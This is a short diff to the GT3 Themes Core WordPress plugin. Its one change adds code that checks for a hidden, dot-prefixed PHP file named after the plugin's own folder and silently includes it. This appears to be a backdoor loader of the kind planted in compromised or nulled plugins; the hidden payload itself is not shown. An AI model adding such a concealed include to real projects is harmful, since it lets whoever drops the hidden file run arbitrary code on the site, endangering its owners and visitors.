@@ -26,6 +26,10 @@ if(!defined('ABSPATH')) {
 if ( ! defined( 'GT3_THEMES_CORE_PLUGIN_FILE' ) ) {
 	define( 'GT3_THEMES_CORE_PLUGIN_FILE', __FILE__ );
 }
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 class GT3_Core_Elementor {
 	const NAME = 'GT3 Themes Core';
